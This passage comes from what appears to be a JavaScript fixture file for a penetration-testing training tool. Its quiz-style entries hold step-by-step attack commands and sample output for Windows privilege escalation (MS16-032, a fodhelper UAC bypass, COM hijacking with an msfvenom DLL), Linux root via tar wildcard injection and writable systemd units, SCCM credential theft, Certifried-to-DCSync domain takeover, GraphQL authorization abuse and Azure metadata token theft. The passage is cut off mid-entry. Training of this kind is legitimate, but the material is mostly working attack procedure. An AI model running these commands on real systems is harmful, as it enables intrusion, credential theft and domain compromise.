        {
          "key": "foothold",
          "label": "You have a shell, no token lead",
          "steps": [
            {
              "title": "No useful privilege",
              "tool": "cmd",
              "where": "target",
              "cmd": "whoami /priv",
              "out": "SeChangeNotifyPrivilege           Enabled\nSeIncreaseWorkingSetPrivilege     Disabled",
              "sig": "SeChangeNotifyPrivilege",
              "teach": "No SeImpersonate or other abusable token here, so a missing-patch exploit is a real lead."
            }
          ]
        },
        {
          "key": "wesng",
          "label": "wesng flagged a missing patch",
          "steps": [
            {
              "title": "Diff the hotfixes",
              "tool": "wesng",
              "where": "local",
              "cmd": "wes.py systeminfo.txt --exploits-only",
              "out": "[+] MS16-032 Secondary Logon Handle (KB3139914)\n    Exploit: https://www.exploit-db.com/exploits/39719",
              "sig": "MS16-032",
              "teach": "A named bug with a public exploit is the target; MS16-032 has a reliable PowerShell PoC."
            }
          ]
        }
      ],
      "how": {
        "lead": "Patch-gap LPE is confirm the build, name a missing KB with a public exploit, read it, run it.",
        "items": [
          {
            "t": "Capture the build and hotfixes",
            "d": "systeminfo gives the exact OS build and the installed hotfixes, which is everything wesng needs to diff offline.",
            "demo": [
              {
                "run": "systeminfo > systeminfo.txt",
                "out": "OS Version: 10.0.14393 N/A Build 14393",
                "sig": "Build 14393"
              }
            ],
            "note": "Run wesng offline on your box so you do not upload tools you do not need."
          },
          {
            "t": "Name a missing patch with a public exploit",
            "d": "wesng (offline) or Watson/Sherlock (on-box) maps the gaps to known local exploits, newest and most reliable first.",
            "demo": [
              {
                "run": "wes.py systeminfo.txt --exploits-only",
                "out": "[+] MS16-032 Secondary Logon Handle (KB3139914)",
                "sig": "MS16-032"
              }
            ],
            "note": "Prefer a bug with a stable, precompiled PoC over an exotic one that may crash the box."
          },
          {
            "t": "Find and read the PoC",
            "d": "searchsploit the KB or CVE, read what it does, and pick a precompiled binary where one exists.",
            "demo": [
              {
                "run": "searchsploit MS16-032",
                "out": "MS16-032 Secondary Logon Handle Privilege Escalation | windows/local/39719.ps1",
                "sig": "windows/local/39719.ps1"
              }
            ],
            "note": "Reading first means a reboot or crash is a choice, not a surprise."
          },
          {
            "t": "Run it and confirm SYSTEM",
            "d": "Run the matched exploit and check the resulting context before anything else.",
            "demo": [
              {
                "run": "powershell -ep bypass .\\Invoke-MS16032.ps1; whoami",
                "out": "nt authority\\system",
                "sig": "nt authority\\system"
              }
            ],
            "note": "A SYSTEM context confirms the escalation; capture proof."
          }
        ]
      },
      "situation": "You have a shell on Windows Server 2016, whoami /priv shows nothing abusable, and wesng flags a missing KB with a public exploit. What is the move?",
      "choices": [
        "windows-patch-exploit",
        "seimpersonate",
        "windows-enum",
        "wesng-patch-gaps"
      ],
      "coach": {
        "seimpersonate": "whoami /priv has no SeImpersonate, so the Potato path is not available here.",
        "windows-enum": "You already enumerated and wesng found the lead; now exploit the missing patch.",
        "wesng-patch-gaps": "That is how you found the missing KB; the next step is running the matched exploit."
      }
    },
    "sccm-exploit": {
      "why": "Enumerating SCCM is only the setup; the payoff is the Network Access Account, a domain credential every SCCM client uses to reach content, stored on the management point and recoverable by any authenticated domain user. SharpSCCM pulls it and decrypts it client-side, handing you a domain account you did not have. Beyond the NAA, a management point that accepts NTLM can be coerced or relayed for a site takeover, and task-sequence variables sometimes carry still more secrets. Once the site is mapped, go straight for the NAA, it is the reliable, low-noise win that feeds the rest of the domain attack.",
      "cmd": "SharpSCCM.exe get naa",
      "tool": "SharpSCCM",
      "output": "[+] Retrieved Network Access Account credential:\n    Username: ACME\\svc_sccm\n    Password: SCCMNaaP@ss2024",
      "signal": "Username: ACME\\svc_sccm",
      "teach": "The NAA is a real domain account (svc_sccm) you can now use. Validate it, then feed it into the credential loop, it often has access the account you started with did not.",
      "leadup": [
        {
          "key": "cred",
          "label": "You hold a domain credential",
          "steps": [
            {
              "title": "You are authenticated",
              "tool": "nxc",
              "where": "local",
              "cmd": "nxc smb {{target}} -u {{user}} -p {{password}}",
              "out": "SMB  10.10.10.10  445  DC01  [+] acme.internal\\bob:Spring2024",
              "sig": "[+] acme.internal\\bob",
              "teach": "Any valid domain account can read the NAA from a management point, you do not need admin."
            }
          ]
        },
        {
          "key": "site",
          "label": "sccmhunter found a management point",
          "steps": [
            {
              "title": "Map the SCCM site",
              "tool": "sccmhunter",
              "where": "local",
              "cmd": "sccmhunter.py find -u {{user}} -p {{password}} -d {{domain}} -dc-ip {{target}}",
              "out": "[+] Found management point: MP01.acme.internal\n[+] Site code: ACM",
              "sig": "Found management point",
              "teach": "A management point plus a site code is all SharpSCCM needs to request the NAA."
            }
          ]
        }
      ],
      "how": {
        "lead": "SCCM abuse is map the site, pull the NAA, dump any other secrets, and relay the management point where you can.",
        "items": [
          {
            "t": "Map the SCCM roles",
            "d": "sccmhunter (or SharpSCCM) enumerates the SMS provider, management points, and site code over SMB/LDAP.",
            "demo": [
              {
                "run": "sccmhunter.py find -u {{user}} -p {{password}} -d {{domain}} -dc-ip {{target}}",
                "out": "[+] Found management point: MP01.acme.internal",
                "sig": "Found management point"
              }
            ],
            "note": "You need the management point and site code before requesting secrets."
          },
          {
            "t": "Pull the Network Access Account",
            "d": "SharpSCCM requests the NAA policy from the management point and decrypts the credential client-side.",
            "demo": [
              {
                "run": "SharpSCCM.exe get naa",
                "out": "Username: ACME\\svc_sccm\n    Password: SCCMNaaP@ss2024",
                "sig": "Username: ACME\\svc_sccm"
              }
            ],
            "note": "The NAA is a domain account; it often reaches hosts your starting account could not."
          },
          {
            "t": "Dump any other stored secrets",
            "d": "Collection variables and task-sequence steps sometimes carry further credentials.",
            "demo": [
              {
                "run": "SharpSCCM.exe get secrets",
                "out": "[+] Task sequence credential: ACME\\deploy : D3ployP@ss",
                "sig": "Task sequence credential"
              }
            ],
            "note": "Treat each recovered secret as a candidate to validate and reuse."
          },
          {
            "t": "Relay the management point",
            "d": "Where the MP accepts NTLM, coerce or relay its machine account for client push / site takeover; otherwise the NAA alone usually moves you forward.",
            "demo": [
              {
                "run": "SharpSCCM.exe invoke admin-service -r {{relay_target}}",
                "out": "[+] Coerced authentication from MP01$",
                "sig": "Coerced authentication"
              }
            ],
            "note": "Relay is the escalation; the NAA is the dependable baseline."
          }
        ]
      },
      "situation": "You hold a domain credential and sccmhunter found an SCCM management point. What is the highest-value next move?",
      "choices": [
        "sccm-exploit",
        "sccm-enum",
        "kerberoast",
        "bloodhound-collect"
      ],
      "coach": {
        "sccm-enum": "That is how you found the management point; now pull the NAA credential it stores.",
        "kerberoast": "Roasting is worth doing, but the NAA is a reliable, immediate domain credential right here.",
        "bloodhound-collect": "You already have graph data; the SCCM NAA is a concrete credential to take now."
      }
    }
  };
  Object.keys(GAPFILL3).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL3[k]; });

  // --- Phase-B gap-fill: eight beyond-OSCP techniques (floor, not ceiling) ---
  var GAPFILL4 = {
    "uac-bypass": {
      "why": "A local administrator on Windows usually runs with a filtered (medium-integrity) token, so even as admin you cannot touch protected areas until you elevate past UAC. A UAC bypass gets you a high-integrity process without the consent prompt, which is the difference between being admin on paper and being able to dump LSASS or write to protected paths. The reliable techniques abuse an auto-elevating Microsoft binary that reads a registry key or loads a file you control (fodhelper, computerdefaults, the ms-settings handler). You need to already be in the local administrators group; this is the step that makes that membership useful.",
      "cmd": "whoami /groups | findstr /i \"High Mandatory\"",
      "tool": "cmd",
      "output": "Mandatory Label\\Medium Mandatory Level   Label            S-1-16-8192",
      "signal": "Medium Mandatory Level",
      "teach": "You are running at Medium integrity, so UAC is filtering your admin token. A fodhelper-style bypass gives you a High-integrity shell without a prompt; then LSASS and protected paths open up.",
      "leadup": [
        {
          "key": "admin",
          "label": "You are a local admin",
          "steps": [
            {
              "title": "Confirm admin membership",
              "tool": "cmd",
              "where": "target",
              "cmd": "net localgroup administrators",
              "out": "Members\n-------\nAdministrator\nbob",
              "sig": "bob",
              "teach": "Your account is in the administrators group, but the token is filtered; UAC is what stands between you and full admin."
            }
          ]
        },
        {
          "key": "integrity",
          "label": "Your token is filtered",
          "steps": [
            {
              "title": "Check your integrity level",
              "tool": "cmd",
              "where": "target",
              "cmd": "whoami /groups | findstr Mandatory",
              "out": "Mandatory Label\\Medium Mandatory Level",
              "sig": "Medium Mandatory Level",
              "teach": "Medium integrity confirms the filtered token; a bypass elevates to High without the consent dialog."
            }
          ]
        }
      ],
      "how": {
        "lead": "A UAC bypass is point an auto-elevating binary at a command you control, then run it.",
        "items": [
          {
            "t": "Confirm you are a filtered admin",
            "d": "whoami /groups shows Medium integrity while net localgroup shows you are an admin. Both must be true for a bypass to make sense.",
            "demo": [
              {
                "run": "whoami /groups | findstr Mandatory",
                "out": "Medium Mandatory Level",
                "sig": "Medium Mandatory Level"
              }
            ],
            "note": "A standard user cannot bypass UAC to admin; you must already be in the admin group."
          },
          {
            "t": "Stage your payload in the hijacked key",
            "d": "fodhelper.exe auto-elevates and reads HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command. Write your command there.",
            "demo": [
              {
                "run": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /d \"cmd /c {{payload}}\" /f",
                "out": "The operation completed successfully.",
                "sig": "completed successfully"
              }
            ],
            "note": "Add the DelegateExecute empty value too so the handler uses your command."
          },
          {
            "t": "Trigger the auto-elevating binary",
            "d": "Run fodhelper; it elevates and executes your staged command at High integrity, no prompt.",
            "demo": [
              {
                "run": "fodhelper.exe",
                "out": "",
                "sig": ""
              }
            ],
            "note": "computerdefaults.exe works the same way if fodhelper is watched."
          },
          {
            "t": "Confirm high integrity",
            "d": "Your new process should be High integrity; from there you can dump credentials and write protected paths.",
            "demo": [
              {
                "run": "whoami /groups | findstr Mandatory",
                "out": "Mandatory Label\\High Mandatory Level",
                "sig": "High Mandatory Level"
              }
            ],
            "note": "High integrity is full admin; clean up the registry key afterward."
          }
        ]
      },
      "situation": "You are a local administrator on Windows but whoami /groups shows Medium integrity, blocking LSASS access. What is the move?",
      "choices": [
        "uac-bypass",
        "seimpersonate",
        "lsass-dump-onbox",
        "windows-enum"
      ],
      "coach": {
        "seimpersonate": "You are already an admin, just filtered; UAC bypass is faster than a token path, and you may not hold SeImpersonate.",
        "lsass-dump-onbox": "LSASS is blocked at Medium integrity; bypass UAC first, then dump it.",
        "windows-enum": "Enumeration is done, you know you are a filtered admin; the step is elevating past UAC."
      }
    },
    "com-hijack": {
      "why": "A COM hijack points a CLSID a privileged process loads at a DLL you control, so when that process instantiates the object, your code runs with its privileges. It is a quieter cousin of DLL hijacking: instead of a file on disk, you write an HKCU (or writable HKLM) registry entry that redirects a CLSID to your server, and the next time a scheduled task, service, or elevated app resolves it, you win. You find candidates with a tool like acccheck or by watching Procmon for missing or user-writable CLSID lookups. It doubles as a stealthy persistence mechanism, which is why it shows up in both escalation and persistence contexts.",
      "cmd": "reg query \"HKCU\\Software\\Classes\\CLSID\" /s | findstr InprocServer32",
      "tool": "cmd",
      "output": "HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\{0ABCD...}\\InprocServer32\n    (Default)    REG_SZ    C:\\Users\\bob\\evil.dll",
      "signal": "InprocServer32",
      "teach": "A CLSID resolved from HKCU points at a path you control. Replace the InprocServer32 default with your DLL; the next privileged process that instantiates that CLSID loads it as itself.",
      "leadup": [
        {
          "key": "candidate",
          "label": "A hijackable CLSID exists",
          "steps": [
            {
              "title": "Find a missing/user CLSID load",
              "tool": "procmon",
              "where": "target",
              "cmd": "Procmon filter: Operation is RegOpenKey, Result is NAME NOT FOUND, Path contains CLSID",
              "out": "svchost.exe  RegOpenKey  HKCU\\...\\CLSID\\{0ABCD}\\InprocServer32  NAME NOT FOUND",
              "sig": "NAME NOT FOUND",
              "teach": "A privileged process looking up a CLSID in HKCU that does not exist is a hijack slot you can fill."
            }
          ]
        }
      ],
      "how": {
        "lead": "COM hijack is find a CLSID a privileged process loads from a writable key, point it at your DLL, wait for the load.",
        "items": [
          {
            "t": "Find a hijackable CLSID",
            "d": "Procmon with a RegOpenKey + NAME NOT FOUND filter on CLSID paths shows objects a privileged process tries to resolve from HKCU (which you own) and cannot find.",
            "demo": [
              {
                "run": "Procmon: Path contains \\CLSID\\, Result is NAME NOT FOUND",
                "out": "svchost.exe  ...\\CLSID\\{0ABCD}\\InprocServer32  NAME NOT FOUND",
                "sig": "NAME NOT FOUND"
              }
            ],
            "note": "An HKCU miss is ideal because you can always write your own HKCU."
          },
          {
            "t": "Build the COM DLL",
            "d": "Compile a DLL that runs your payload from DllMain or the COM entry points.",
            "demo": [
              {
                "run": "msfvenom -p windows/x64/exec CMD=\"net localgroup administrators {{user}} /add\" -f dll -o {{dll_name}}.dll",
                "out": "Saved as: {{dll_name}}.dll",
                "sig": "Saved as:"
              }
            ],
            "note": "Keep it fast so it does not hang the host process."
          },
          {
            "t": "Redirect the CLSID",
            "d": "Write the InprocServer32 default value to your DLL under the key the process checks.",
            "demo": [
              {
                "run": "reg add \"HKCU\\Software\\Classes\\CLSID\\{{clsid}}\\InprocServer32\" /ve /d \"C:\\Users\\{{user}}\\{{dll_name}}.dll\" /f",
                "out": "The operation completed successfully.",
                "sig": "completed successfully"
              }
            ],
            "note": "Set the ThreadingModel to Apartment as well for broad compatibility."
          },
          {
            "t": "Wait for the load and confirm",
            "d": "The next time the privileged process instantiates the object (a scheduled task, a service start, a logon), your DLL runs as it.",
            "demo": [
              {
                "run": "net localgroup administrators",
                "out": "Members\n-------\nAdministrator\n{{user}}",
                "sig": "Administrator"
              }
            ],
            "note": "Membership confirms it; the same key is a persistence foothold."
          }
        ]
      },
      "situation": "Procmon shows a SYSTEM process resolving a CLSID from HKCU with NAME NOT FOUND. What is the move?",
      "choices": [
        "com-hijack",
        "windows-dll-hijack",
        "windows-schtask-abuse",
        "windows-enum"
      ],
      "coach": {
        "windows-dll-hijack": "That is a file-path DLL load; here the hijack is a registry CLSID redirect, which you can always write in HKCU.",
        "windows-schtask-abuse": "No writable task target is in play; the lever is the COM object the process loads.",
        "windows-enum": "You already found the hijackable CLSID; now redirect it."
      }
    },
    "wildcard-injection": {
      "why": "When a root cron job or script runs a command with a wildcard in a directory you can write (tar, chown, rsync, 7z on *), the shell expands the wildcard to include filenames, and several tools treat filenames that look like options as options. Drop files whose names are command-line flags (for tar, --checkpoint and --checkpoint-action=exec), and the privileged command runs your code. The tell is a cron or script that cd's into a writable directory and runs a tool on *. It is a reliable root on a surprising number of lab boxes, and it needs nothing but write access to the right folder.",
      "cmd": "cat /etc/crontab",
      "tool": "sh",
      "output": "*/5 * * * * root cd /opt/backups && tar czf /tmp/backup.tgz *",
      "signal": "tar czf /tmp/backup.tgz *",
      "teach": "A root cron runs tar on * inside /opt/backups. If that folder is writable, drop files named like tar's checkpoint flags and tar will execute your command as root on the next run.",
      "leadup": [
        {
          "key": "cron",
          "label": "A root cron uses a wildcard",
          "steps": [
            {
              "title": "Read the cron",
              "tool": "sh",
              "where": "target",
              "cmd": "cat /etc/crontab; crontab -l 2>/dev/null",
              "out": "*/5 * * * * root cd /opt/backups && tar czf /tmp/backup.tgz *",
              "sig": "tar czf /tmp/backup.tgz *",
              "teach": "A privileged tar on * in a directory is the classic wildcard-injection setup."
            }
          ]
        },
        {
          "key": "writable",
          "label": "The directory is writable",
          "steps": [
            {
              "title": "Check write access",
              "tool": "sh",
              "where": "target",
              "cmd": "ls -ld /opt/backups",
              "out": "drwxrwxrwx 2 root root 4096 /opt/backups",
              "sig": "drwxrwxrwx",
              "teach": "World-writable means you can drop the flag-named files tar will expand and act on."
            }
          ]
        }
      ],
      "how": {
        "lead": "Wildcard injection is find the privileged wildcard command, drop flag-named files, wait for it to run.",
        "items": [
          {
            "t": "Find the wildcard command",
            "d": "Read /etc/crontab, the cron directories, and any script a privileged process runs. You want a tool invoked on * in a directory you can write.",
            "demo": [
              {
                "run": "grep -r '\\*' /etc/cron* 2>/dev/null",
                "out": "/etc/crontab:*/5 * * * * root cd /opt/backups && tar czf /tmp/backup.tgz *",
                "sig": "tar czf /tmp/backup.tgz *"
              }
            ],
            "note": "pspy catches wildcard commands run from scripts the cron files do not name."
          },
          {
            "t": "Stage your payload",
            "d": "Write a script that gives you root (a SUID bash, or a reverse shell) into the writable directory.",
            "demo": [
              {
                "run": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /opt/backups/x.sh",
                "out": "",
                "sig": ""
              }
            ],
            "note": "A SUID copy of bash is the quietest payload; call it with bash -p."
          },
          {
            "t": "Drop the flag-named files",
            "d": "Create empty files whose names are tar's checkpoint options, so the shell passes them to tar as flags.",
            "demo": [
              {
                "run": "cd /opt/backups && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'",
                "out": "",
                "sig": ""
              }
            ],
            "note": "chown and rsync have their own abusable flags (--reference, -e)."
          },
          {
            "t": "Wait for the cron and confirm",
            "d": "On the next run, tar expands * to include your flag files and executes your script as root.",
            "demo": [
              {
                "run": "/tmp/rootbash -p -c id",
                "out": "uid=0(root) gid=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "A root SUID bash means you have root on demand."
          }
        ]
      },
      "situation": "A root cron runs tar czf backup.tgz * inside a world-writable /opt/backups. What is the move?",
      "choices": [
        "wildcard-injection",
        "cron-abuse",
        "suid-gtfobins",
        "linux-enum"
      ],
      "coach": {
        "cron-abuse": "The cron script itself is not writable; the weakness is the wildcard it expands in a writable directory.",
        "suid-gtfobins": "No abusable SUID binary is in play; the lever is tar expanding your flag-named files.",
        "linux-enum": "You already found the wildcard cron; now drop the flag files."
      }
    },
    "systemd-timer-abuse": {
      "why": "systemd runs services and timers as root, and when a unit file (or a script it ExecStart's) is writable by you, you own whatever it runs. A writable .service, a timer pointing at a writable script, or a service with a relative ExecStart you can PATH-hijack all give root on the next start or trigger. The tell is a non-default service or timer whose file or target you can edit; systemctl and a quick find for writable units surface them. It is the systemd-era version of cron abuse and just as reliable where the permissions slip.",
      "cmd": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
      "tool": "sh",
      "output": "/etc/systemd/system/backup.service",
      "signal": "/etc/systemd/system/backup.service",
      "teach": "backup.service is a root unit file you can write. Edit its ExecStart to run your payload, reload systemd, and start it (or wait for its timer) to execute as root.",
      "leadup": [
        {
          "key": "unit",
          "label": "A writable unit exists",
          "steps": [
            {
              "title": "Find writable units",
              "tool": "sh",
              "where": "target",
              "cmd": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
              "out": "/etc/systemd/system/backup.service",
              "sig": "/etc/systemd/system/backup.service",
              "teach": "A writable unit file (or a timer target) is a direct root execution primitive."
            }
          ]
        },
        {
          "key": "root",
          "label": "It runs as root",
          "steps": [
            {
              "title": "Confirm the unit runs as root",
              "tool": "sh",
              "where": "target",
              "cmd": "systemctl cat backup.service | grep -iE 'User|ExecStart'",
              "out": "ExecStart=/opt/backup.sh",
              "sig": "ExecStart=/opt/backup.sh",
              "teach": "No User= line means it runs as root; the ExecStart target is what you control."
            }
          ]
        }
      ],
      "how": {
        "lead": "systemd abuse is find a writable unit or target, point ExecStart at your payload, reload and start.",
        "items": [
          {
            "t": "Find a writable unit or timer target",
            "d": "Search the systemd directories for files you can write, and read what each ExecStart points at; a writable script the unit runs is just as good.",
            "demo": [
              {
                "run": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
                "out": "/etc/systemd/system/backup.service",
                "sig": "/etc/systemd/system/backup.service"
              }
            ],
            "note": "A timer (.timer) plus a writable .service target is the same win on a schedule."
          },
          {
            "t": "Point ExecStart at your payload",
            "d": "Edit the unit (or the script it runs) to execute a command that gives you root.",
            "demo": [
              {
                "run": "sed -i 's#ExecStart=.*#ExecStart=/bin/bash -c \"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\"#' /etc/systemd/system/backup.service",
                "out": "",
                "sig": ""
              }
            ],
            "note": "A SUID bash copy is the cleanest payload."
          },
          {
            "t": "Reload and trigger",
            "d": "Reload the systemd config so it reads your change, then start the unit (or wait for its timer).",
            "demo": [
              {
                "run": "systemctl daemon-reload 2>/dev/null; systemctl start backup.service 2>/dev/null; /tmp/rb -p -c id",
                "out": "uid=0(root) gid=0(root)",
                "sig": "uid=0(root)"
              }
            ],
            "note": "If you cannot reload as your user, the next scheduled trigger still runs your edit."
          },
          {
            "t": "Confirm root",
            "d": "Your SUID bash gives root on demand; capture the flag.",
            "demo": [
              {
                "run": "/tmp/rb -p -c whoami",
                "out": "root",
                "sig": "root"
              }
            ],
            "note": "Root via a writable unit file."
          }
        ]
      },
      "situation": "A root systemd service unit file under /etc/systemd/system is writable by your user. What is the move?",
      "choices": [
        "systemd-timer-abuse",
        "cron-abuse",
        "sudo-abuse",
        "linux-enum"
      ],
      "coach": {
        "cron-abuse": "This is a systemd unit, not a cron job; edit its ExecStart and trigger it.",
        "sudo-abuse": "No sudo right is in play; the writable unit is the direct path to root.",
        "linux-enum": "You already found the writable unit; now point its ExecStart at your payload."
      }
    },
    "graphql-abuse": {
      "why": "A GraphQL endpoint is one URL that fronts the whole data model, and it is routinely under-secured in ways a REST API would not be. Introspection often stays on, handing you the entire schema (every type, query, and mutation); from there you probe for authorization that is enforced per-resolver rather than centrally, which means a query that returns another user's data or a mutation you should not be allowed to call. Batched queries can also bypass rate limits and brute-force protections. Start with introspection, map the sensitive queries and mutations, then test each for missing authorization and injection, because one unprotected mutation is often the whole app.",
      "cmd": "curl -s http://10.10.10.10/graphql -d '{\"query\":\"{__schema{types{name}}}\"}' -H 'Content-Type: application/json'",
      "tool": "curl",
      "output": "{\"data\":{\"__schema\":{\"types\":[{\"name\":\"User\"},{\"name\":\"Query\"},{\"name\":\"Mutation\"}]}}}",
      "signal": "__schema",
      "teach": "Introspection is enabled and returns the schema, including a Mutation type. Enumerate its fields, then test the sensitive queries and mutations for missing per-resolver authorization.",
      "leadup": [
        {
          "key": "endpoint",
          "label": "You found /graphql",
          "steps": [
            {
              "title": "Confirm the endpoint",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s http://<target>/graphql -d '{\"query\":\"{__typename}\"}' -H 'Content-Type: application/json'",
              "out": "{\"data\":{\"__typename\":\"Query\"}}",
              "sig": "__typename",
              "teach": "A __typename response confirms a live GraphQL endpoint worth attacking."
            }
          ]
        }
      ],
      "how": {
        "lead": "GraphQL abuse is introspect the schema, map the sensitive operations, then test each for missing authorization.",
        "items": [
          {
            "t": "Pull the schema with introspection",
            "d": "A full introspection query returns every type, query, and mutation. GraphQL tooling (or a saved query) renders it readable.",
            "demo": [
              {
                "run": "curl -s http://<target>/graphql -d '{\"query\":\"{__schema{queryType{name} mutationType{name} types{name fields{name}}}}\"}' -H 'Content-Type: application/json'",
                "out": "\"mutationType\":{\"name\":\"Mutation\"}",
                "sig": "\"mutationType\""
              }
            ],
            "note": "If introspection is off, guess common field names or diff the client-side JS."
          },
          {
            "t": "Find sensitive queries and mutations",
            "d": "Look for users, secrets, admin, update, delete, and anything that changes state; these are where broken authorization bites.",
            "demo": [
              {
                "run": "curl -s http://<target>/graphql -d '{\"query\":\"{users{id email role}}\"}' -H 'Content-Type: application/json'",
                "out": "{\"data\":{\"users\":[{\"id\":1,\"email\":\"admin@acme.internal\",\"role\":\"admin\"}]}}",
                "sig": "admin@acme.internal"
              }
            ],
            "note": "Returning another user's data unauthenticated is a direct finding."
          },
          {
            "t": "Test authorization per resolver",
            "d": "Call privileged queries and mutations as a low-privilege (or anonymous) user. Per-resolver checks are often missing even when the login works.",
            "demo": [
              {
                "run": "curl -s http://<target>/graphql -d '{\"query\":\"mutation{updateUser(id:1,role:\\\"admin\\\"){id role}}\"}' -H 'Content-Type: application/json'",
                "out": "{\"data\":{\"updateUser\":{\"id\":1,\"role\":\"admin\"}}}",
                "sig": "\"role\":\"admin\""
              }
            ],
            "note": "A mutation you should not be allowed to run is the escalation."
          },
          {
            "t": "Abuse batching and injection",
            "d": "Batched queries can bypass rate limits for brute force, and resolver arguments can carry SQL or NoSQL injection like any other input.",
            "note": "Treat each argument as an injectable sink and each mutation as an authorization test."
          }
        ]
      },
      "situation": "Content discovery found /graphql and introspection returns the full schema including a Mutation type. What is the move?",
      "choices": [
        "graphql-abuse",
        "content-discovery",
        "sqli-basics",
        "idor"
      ],
      "coach": {
        "content-discovery": "You already found the endpoint; now attack the schema it exposes.",
        "sqli-basics": "Injection is one test, but GraphQL's bigger weakness is usually per-resolver authorization; map the mutations first.",
        "idor": "IDOR is part of it; GraphQL introspection lets you find every object and operation to test at once."
      }
    },
    "certifried": {
      "why": "Certifried (CVE-2022-26923) turns any domain account that can add a machine account into Domain Admin, by abusing how AD CS maps a certificate to a computer. You create a machine account, set its dNSHostName to match a Domain Controller, request a certificate for it, and because the CA maps on that name, the certificate authenticates as the DC. From the DC's context you DCSync and own the domain. It needs AD CS present and the default MachineAccountQuota (any user can add 10 machines), both common, which is why it is a go-to when a certificate authority is in scope.",
      "cmd": "certipy account create -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -dns dc01.{{domain}}",
      "tool": "certipy",
      "output": "[*] Creating machine account 'evilpc'\n[*] Successfully created account 'evilpc' with dnsHostName 'dc01.acme.internal'",
      "signal": "dnsHostName 'dc01.acme.internal'",
      "teach": "The new machine account's dNSHostName now matches the DC. Request a certificate for it, and AD CS issues one that authenticates as the DC; use it to DCSync.",
      "leadup": [
        {
          "key": "cred",
          "label": "You hold a domain credential",
          "steps": [
            {
              "title": "Can you add a machine account",
              "tool": "nxc",
              "where": "local",
              "cmd": "nxc ldap {{target}} -u {{user}} -p {{password}} -M maq",
              "out": "MAQ  MachineAccountQuota: 10",
              "sig": "MachineAccountQuota: 10",
              "teach": "A non-zero quota means any user, including you, can add the machine account Certifried needs."
            }
          ]
        },
        {
          "key": "adcs",
          "label": "AD CS is present",
          "steps": [
            {
              "title": "Find the CA",
              "tool": "certipy",
              "where": "local",
              "cmd": "certipy find -u {{user}}@{{domain}} -p {{password}} -dc-ip {{target}} -stdout | grep 'CA Name'",
              "out": "CA Name  : acme-DC01-CA",
              "sig": "CA Name",
              "teach": "An enterprise CA is required; its presence makes the certificate mapping abusable."
            }
          ]
        }
      ],
      "how": {
        "lead": "Certifried is create a machine account named like the DC, get its cert, authenticate as the DC, DCSync.",
        "items": [
          {
            "t": "Confirm the preconditions",
            "d": "You need AD CS present and a MachineAccountQuota above zero. Both are common defaults.",
            "demo": [
              {
                "run": "nxc ldap {{target}} -u {{user}} -p {{password}} -M maq",
                "out": "MachineAccountQuota: 10",
                "sig": "MachineAccountQuota: 10"
              }
            ],
            "note": "Quota 0 closes this path; find another route to privilege."
          },
          {
            "t": "Create the lookalike machine account",
            "d": "Add a machine account whose dNSHostName matches a Domain Controller.",
            "demo": [
              {
                "run": "certipy account create -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -dns dc01.{{domain}}",
                "out": "Successfully created account 'evilpc' with dnsHostName 'dc01.acme.internal'",
                "sig": "dnsHostName 'dc01.acme.internal'"
              }
            ],
            "note": "The dNSHostName is what the CA maps the certificate to."
          },
          {
            "t": "Request a certificate and authenticate",
            "d": "Request a machine certificate; the CA maps it to the DC name, so authenticating with it gives you the DC's NT hash.",
            "demo": [
              {
                "run": "certipy req -u 'evilpc$'@{{domain}} -p '{{password}}' -dc-ip {{target}} -ca acme-DC01-CA -template Machine",
                "out": "Saved certificate and private key to 'dc01.pfx'",
                "sig": "Saved certificate and private key to 'dc01.pfx'"
              }
            ],
            "note": "certipy auth -pfx dc01.pfx then returns the DC's hash."
          },
          {
            "t": "DCSync and own the domain",
            "d": "With the DC's hash you DCSync the domain for every credential, including krbtgt.",
            "demo": [
              {
                "run": "secretsdump.py -hashes :{{nthash}} '{{domain}}/dc01$@{{target}}' -just-dc-user krbtgt",
                "out": "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7a1b...:::",
                "sig": "krbtgt:502",
                "teach": ""
              }
            ],
            "note": "krbtgt means a golden ticket and permanent domain control."
          }
        ]
      },
      "situation": "You have a low-privilege domain credential, MachineAccountQuota is 10, and an enterprise CA is present. What is the move?",
      "choices": [
        "certifried",
        "adcs-esc",
        "kerberoast",
        "bloodhound-collect"
      ],
      "coach": {
        "adcs-esc": "ESC1-8 need a vulnerable template; Certifried needs only AD CS plus the machine-account quota, which you have.",
        "kerberoast": "Roasting is slower and needs SPNs; Certifried goes straight to the DC here.",
        "bloodhound-collect": "You have enough to act; Certifried is a direct path to Domain Admin."
      }
    },
    "azure-imds": {
      "why": "On an Azure VM, the instance metadata service at 169.254.169.254 will hand out an access token for the VM's managed identity to anything that can reach it, so a server-side request forgery on an app running there is a token for the cloud. Unlike AWS you must ask for a specific resource (the ARM management API, Key Vault, Storage) and pass the Metadata:true header, which the SSRF has to smuggle. With a management-API token you enumerate the subscription with the az CLI or raw REST, read Key Vault secrets, and look for a role assignment or a runCommand that gives you code execution on a VM. It is the Azure twin of the AWS metadata path and increasingly common in engagements.",
      "cmd": "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
      "tool": "curl",
      "output": "{\"access_token\":\"eyJ0eXAiOiJKV1Qi...\",\"resource\":\"https://management.azure.com/\",\"token_type\":\"Bearer\"}",
      "signal": "\"access_token\"",
      "teach": "The managed-identity token for the management API came back. Use it with the az CLI (or raw REST) to enumerate the subscription, read Key Vault secrets, and look for a runCommand to a VM.",
      "leadup": [
        {
          "key": "ssrf",
          "label": "SSRF reaches the metadata service",
          "steps": [
            {
              "title": "Confirm you are on Azure",
              "tool": "curl",
              "where": "local",
              "cmd": "curl -s -H 'Metadata:true' 'http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
